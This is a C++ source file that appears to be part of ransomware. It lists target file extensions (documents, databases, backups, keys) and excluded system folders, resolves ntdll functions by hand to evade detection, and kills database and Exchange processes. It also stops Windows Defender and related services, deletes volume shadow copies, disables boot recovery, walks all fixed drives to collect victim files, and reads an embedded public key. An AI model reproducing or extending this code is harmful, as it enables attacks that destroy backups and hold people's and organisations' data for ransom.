#include "tools.h"
#include "crypt.h"

const char* avoid_file[] = {
"Content.IE5", "Temporary Internet Files",
"\\Local Settings\\Temp", "\\AppData\\Local\\Temp",
"\\Program Files (x86)", "\\Program Files",
"\\Windows","\\ProgramData", "\\Intel", "$" };
const char* ext_file[] = {
	".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pst",".ost",".msg",".eml",".vsd",".vsdx",".txt",".csv",".rtf", ".123",".wks",".wk1"
	,".pdf",".dwg",".onetoc2",".snt",".jpeg",".jpg",".docb",".docm",".dot",".dotm",".dotx",".xlsm",".xlsb",".xlw",".xlt",".xlm",".xlc",".xltx",".xltm"
	,".pptm",".pot",".pps",".ppsm",".ppsx",".ppam",".potx",".potm",".edb",".hwp",".602",".sxi",".sti",".sldx",".sldm",".sldm",".vdi",".vmdk",".vmx",".gpg"
	,".aes",".ARC",".PAQ",".bz2",".tbk",".bak",".tar",".tgz",".gz",".7z",".rar",".zip",".backup",".iso",".vcd",".bmp",".png",".gif",".raw",".cgm",".tif"
	,".tiff",".nef",".psd",".ai",".svg",".djvu",".m4u",".m3u",".mid",".wma",".flv",".3g2",".mkv",".3gp",".mp4",".mov",".avi",".asf",".mpeg",".vob",".mpg"
	,".wmv",".fla",".swf",".wav",".mp3",".sh", ".class",".jar",".java",".rb",".asp",".php",".jsp",".brd",".sch",".dch",".dip",".pl",".vb",".vbs",".ps1",".bat"
	,".cmd",".js",".asm",".h",".pas",".cpp",".c",".cs",".suo",".sln",".ldf",".mdf",".ibd",".myi",".myd",".frm",".odb",".dbf",".db",".mdb",".accdb",".sql"
	,".sqlitedb",".sqlite3",".asc",".lay6",".lay",".mml",".sxm",".otg",".odg",".uop",".std",".sxd",".otp",".odp",".wb2",".slk",".dif",".stc",".sxc"
	,".ots",".ods", ".3dm",".max", ".3ds",".uot",".stw",".sxw",".ott",".odt",".pem",".p12",".csr",".crt",".key",".pfx",".der"
};

PVOID MyGetProcAddress(HINSTANCE ModuleBase, LPSTR FuncName) {
	PIMAGE_DOS_HEADER pImage = (PIMAGE_DOS_HEADER)(ModuleBase);
	if (pImage->e_magic != IMAGE_DOS_SIGNATURE)
		return ERROR;

	PIMAGE_NT_HEADERS32 NtHeader = (PIMAGE_NT_HEADERS32)(((PBYTE)(ModuleBase)+pImage->e_lfanew));
	if (NtHeader->Signature != IMAGE_NT_SIGNATURE)
		return ERROR;

	PIMAGE_EXPORT_DIRECTORY ExportDirectory = PIMAGE_EXPORT_DIRECTORY(PVOID(NtHeader->OptionalHeader.DataDirectory[0].VirtualAddress + (PBYTE)(ModuleBase)));
	if (!ExportDirectory)
		return ERROR;

	PDWORD AddressOfNames = PDWORD(ExportDirectory->AddressOfNames + (PBYTE)(ModuleBase));

	for (int i = 0; i < ExportDirectory->NumberOfNames; i++)
	{
		LPSTR ImportFunc = LPSTR((PBYTE)(ModuleBase)+AddressOfNames[i]);
		if (strcmp(ImportFunc, FuncName) == 0)
		{
			PDWORD AddressOfunctions = PDWORD(ExportDirectory->AddressOfFunctions + (PBYTE)(ModuleBase));
			PWORD AddressOfOrdinals = PWORD(ExportDirectory->AddressOfNameOrdinals + (PBYTE)(ModuleBase));
			return (PVOID((PBYTE)(ModuleBase)+AddressOfunctions[AddressOfOrdinals[i]]));
		}
	}
	return ERROR;
}
bool LoadAPI() {
	NtQuerySystemInformation = (PNtQuerySystemInformation)MyGetProcAddress(GetModuleHandle("ntdll.dll"), (LPSTR)"NtQuerySystemInformation");

	NtQueryObject = (PNtQueryObject)MyGetProcAddress(GetModuleHandle("ntdll.dll"), (LPSTR)"NtQueryObject");

	NtQueryInformationThread = (PNtQueryInformationThread)MyGetProcAddress(GetModuleHandle("ntdll.dll"), (LPSTR)"NtQueryInformationThread");

	NtQueryInformationFile = (PNtQueryInformationFile)MyGetProcAddress(GetModuleHandle("ntdll.dll"), (LPSTR)"NtQueryInformationFile");

	NtQueryInformationProcess = (PNtQueryInformationProcess)MyGetProcAddress(GetModuleHandle("ntdll.dll"), (LPSTR)"NtQueryInformationProcess");

	if (NtQuerySystemInformation && NtQueryObject && NtQueryInformationThread && NtQueryInformationFile && NtQueryInformationProcess) return true;
	return false;
}

void close_handles(pFileLinkedList file_head) {
	system("taskkill.exe /f /im mysqld.exe");
	system("taskkill.exe /f /im sqlwriter.exe");
	system("taskkill.exe /f /im sqlserver.exe");
	system("taskkill.exe /f /im MSExchange*");
	system("taskkill.exe /f /im Microsoft.Exchange.*");

	system("/C sc stop VVS");
	system("/C sc stop wscsvc");
	system("/C sc stop WinDefend");
	system("/C sc stop wuauserv");
	system("/C sc stop BITS");
	system("/C sc stop ERSvc");
	system("/C sc stop WerSvc");
	system("/C vssadmin.exe Delete Shadows /All /Quiet");
	system("/C bcdedit /set{ default } recoveryenabled No");
	system("/C bcdedit /set{ default } bootstatuspolicy ignoreallfailures”");
	
}
void list_files(pFileLinkedList &file_head, pFileLinkedList& file_tail) {
	DWORD ret = 0;
	char buff[MAXD];
	char tmp[8];
	int pre = 0;
	
	ret = GetLogicalDriveStrings(MAXD, buff);
	if (ret == 0) printf("GetLogicalDriveStrings failed %lu", GetLastError());

	else {
		for (int i = 0; i < ret; ++i) {
			if (buff[i] != '\0') continue;
			else {
				memset(tmp, 0, 8);
				memcpy(tmp, &buff[pre], strlen(&buff[pre]) + 1);
				switch (GetDriveType(tmp)) {
				case DRIVE_UNKNOWN:
					break;
				case DRIVE_NO_ROOT_DIR:
					break;
				case DRIVE_REMOVABLE:
					break;
				case DRIVE_FIXED:
					get_list(tmp, file_head,file_tail);
					break;
				case DRIVE_REMOTE:
					break;
				case DRIVE_CDROM:
					break;
				case DRIVE_RAMDISK:
					break;

				}
				pre = i + 1;
			}
		}
	}
}
bool get_list(char dir[MAX_PATH], pFileLinkedList &file_head, pFileLinkedList& file_tail) { //this is a recursive function to get all the files and files inside sub directories located in dir path
	HANDLE file;
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER file_size;
	char file_path[MAX_PATH], copy_path[MAX_PATH], *pos = NULL;
	bool flg = false;

	for (int i = 0; i < _countof(avoid_file); ++i) if (strstr(dir, avoid_file[i]) != NULL) return false;

	if (memcmp(&dir[strlen(dir) - 1], "\\", 1) == 0) memcpy(&dir[strlen(dir)], "*", 2);
	else memcpy(&dir[strlen(dir)], "\\*", 3);
	file = FindFirstFile(dir, &ffd);
	if (file != INVALID_HANDLE_VALUE) {
		while (1) {
			if (((memcmp(ffd.cFileName, ".", 1) == 0) && (strlen(ffd.cFileName) == 1)) || ((memcmp(ffd.cFileName, "..", 2) == 0) && (strlen(ffd.cFileName) == 2))) {
				if (FindNextFile(file, &ffd) == 0) break;
				continue;
			}
			if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				memcpy(file_path, dir, strlen(dir) - 1);
				memcpy(&file_path[strlen(dir) - 1], ffd.cFileName, strlen(ffd.cFileName) + 1);
				get_list(file_path, file_head, file_tail);
			}
			else {
				file_size.LowPart = ffd.nFileSizeLow;
				file_size.HighPart = ffd.nFileSizeHigh;
				for (int i = 0; i < _countof(ext_file); ++i) {
					if ((pos = strchr(ffd.cFileName, '.')) == NULL) {
						flg = true;
						break;
					}
					if (memcmp(pos, ext_file[i], strlen(ext_file[i]) >= strlen(pos) ? strlen(ext_file[i]) : strlen(pos)) == 0) {
						flg = true;
						break;
					}
					for(int j = strlen(ffd.cFileName); j >= 0; --j) {
						if (ffd.cFileName[j] == '.') {
							if (memcmp(&ffd.cFileName[j], ext_file[i], strlen(ext_file[i]) >= strlen(&ffd.cFileName[j]) ? strlen(ext_file[i]) : strlen(&ffd.cFileName[j])) == 0) {
								flg = true;
								break;
							}
						}
					}
				}
				//if (memcmp(dir, "P:\\Crypt_test_Only", 18) != 0) flg = false;
				if (flg) {
					pFileLinkedList tmp = new FileLinkedList;
					memcpy(copy_path, dir, strlen(dir) - 1);
					memcpy(&copy_path[strlen(dir) - 1], ffd.cFileName, strlen(ffd.cFileName) + 1);
					memcpy(tmp->file_path, copy_path, MAX_PATH);
					tmp->size = file_size.QuadPart;
					//TODO: filetmp->priority
					if (file_head == NULL) {
						tmp->next = NULL;
						tmp->pre = NULL;
						file_head = file_tail = tmp;
					}
					else {
						tmp->next = file_head;
						tmp->pre = NULL;
						file_head->pre = tmp;
						file_head = tmp;
					}
					flg = false;
				}
			}
			if (FindNextFile(file, &ffd) == 0) break;
		}
	}
	return true;
}
bool load_public_key(LPVOID pub_key, DWORD *size) {
	HANDLE handle = NULL, file = NULL;
	MODULEENTRY32 me;
	LPVOID base = NULL;
	IMAGE_DOS_HEADER dos = { 0 };
	IMAGE_NT_HEADERS nt = { 0 };
	DWORD ret = 0;

	while (1) {
		handle = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
		if (handle == INVALID_HANDLE_VALUE) {
			if (ERROR_BAD_LENGTH == GetLastError()) continue;
			else {
				puts("Unkown error\n");
				return false;
			}
		}
		else break;
	}

	me.dwSize = sizeof(MODULEENTRY32);

	if (!Module32First(handle, &me)) {
		printf("Module32First failed %lu\n", GetLastError());
		return false;
	}
	base = me.modBaseAddr;
	CloseHandle(handle);

	if (!ReadProcessMemory(GetCurrentProcess(), base, &dos, sizeof(IMAGE_DOS_HEADER), 0)) {
		puts("ReadProcessMemory failed\n");
		return false;
	}
	if (dos.e_magic != IMAGE_DOS_SIGNATURE) {
		puts("inavlid PE\n");
		return false;
	}
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((PBYTE)base + dos.e_lfanew), &nt, sizeof(IMAGE_NT_HEADERS), 0)) {
		puts("ReadProcessMemory failed\n");
		return false;
	}
	if (nt.Signature != IMAGE_NT_SIGNATURE) {
		puts("not valid nt signature\n");
		return false;
	}

	PIMAGE_SECTION_HEADER crypt = new IMAGE_SECTION_HEADER[nt.FileHeader.NumberOfSections];


	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((PBYTE)base + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS)), crypt, sizeof(IMAGE_SECTION_HEADER) * nt.FileHeader.NumberOfSections, 0)) {
		puts("ReadProcessMemory failed\n");
		return false;
	}


	int i = 0;
	for (i = nt.FileHeader.NumberOfSections - 1; i >= 0; --i) {
		if (memcmp(crypt[i].Name, "pkey", 4) == 0) break;
	}

	if (i > -1) {
		if (*size < crypt[i].Misc.VirtualSize) {
			*size = crypt[i].Misc.VirtualSize;
			return true;
		}
		
		memcpy(pub_key, (LPVOID)((DWORD)base + crypt[i].VirtualAddress), crypt[i].Misc.VirtualSize);
		return true;
	}
	else {
		puts("could not find key section\n");
		return false;
	}
}